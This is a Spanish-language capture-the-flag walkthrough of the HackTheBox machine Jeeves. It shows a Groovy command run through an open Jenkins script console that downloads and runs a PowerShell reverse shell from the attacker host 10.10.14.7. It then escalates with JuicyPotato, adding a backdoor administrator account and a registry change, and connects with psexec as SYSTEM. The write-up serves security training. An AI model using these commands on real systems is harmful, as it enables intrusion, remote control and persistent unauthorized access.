---
layout: post
title: HTB_Jeeves
date: 2023/07/10
slug: HTB_Jeeves
heroImage: /assets/machines.jpg
---

# Jeeves {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Jeeves.

El replay del live se puede ver aqui

[![S4vitaar Jeeves maquina](https://img.youtube.com/vi/-o1c3s1QKUg/0.jpg)](https://www.youtube.com/watch?v=-o1c3s1QKUg)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.63
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.63
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.63 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,445,50000 10.10.10.63 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web, Fuzzing       |            |
| 135    | msrpc    |                    |            |
| 445    | smb      | Null session       |            |
| 50000  | http     | Web, Fuzzing       |            |

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.63
smbclient -L 10.10.10.63 -N
smbmap -H 10.10.10.63 -u 'null'
```

Solo hemos podido comprobar que estamos frente a una maquina windows 10 pero poco mas.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.63
```

Estamos en frente de un IIS

#### Analyzando la web con Firefox {-}

Vemos una pagina de busqueda typo Google.

Buscando en internet vemos una routa potencial que seria 
```bash
 /askjeeves/ 
```
 pero no nos da en este caso

Intentamos ver lo que hay en el puerto **50000** y tenemos un 404. Si le ponemos el 
```bash
 /askjeeves/ 
```
, llegamos en 
un panel de administration de Jenkins.



## Vulnerability Assessment {-}

### Vulnerabilidad Jenkins {-}

Teniendo accesso al panel de administracion de Jenkins es un problema ademas si hay en el menu el boton Administrar Jenkins.
Aqui es el caso.

Pinchamos a Administrar Jenkins y despues le damos a Consola de scripts.

Aqui podemos crear Groovy script

```bash
command = "whoami"
println(command.execute().text)
```

Si ejecutamos el commando vemos en la respuesta 
```bash
 jeeves\kohsuke 
```
. Vemos con esto que tenemos capacidad de RCE.

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Jenkins Consola de scripts {-}

1. Descargamos Nishang y modificamos el fichero de reverse shell por tcp

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang/Shells
    cp Invoke-PowerShellTcp.ps1 ../../PS.ps1
    cd ../..
    nano PS.ps1
    ```

    Modificamos el fichero PS.ps1 para añadir 
```bash
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443 
```
 al final del fichero

1. Compartimos un servicio http con python

    ```bash
    python3 -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Creamos el Groovy script

    ```bash
    command = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')"
    println(command.execute().text)
    ```

Ya hemos ganado accesso al systema. 
```bash
 whoami 
```
 -> **jeeves\kohsuke**. Ya podemos leer la flag.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el 
```bash
 SeImpersonatePrivilege 
```
 ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
```

Nos creamos un nuevo usuario con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar s4vitar1234$! /add"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
```

Si comprobamos con el commando 
```bash
 crackmapexec smb 10.10.10.63 -u 's4vitar' -p 's4vitar1234$!' 
```
 Vemos que el usuario no esta pwned.
Aqui tenemos que 

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Si comprobamos otra vez con crackmapexec, vemos ahora que el usuario s4vitar esta pwned.
Ya nos podemos connectar con psexec

```bash
impacket-psexec WORKGROUP/s4vitar@10.10.10.63 cmd.exe
Password: s4vitar1234$!

whoami

#Output
nt authority\system

cd C:\Users\Adminstrator\Desktop
dir
type hm.txt
```

Aqui nos dice que la flag no esta aqui. Pensamos a Alternative Data Streams.

```bash
dir /r
more < hm.txt:root.txt
```

;)
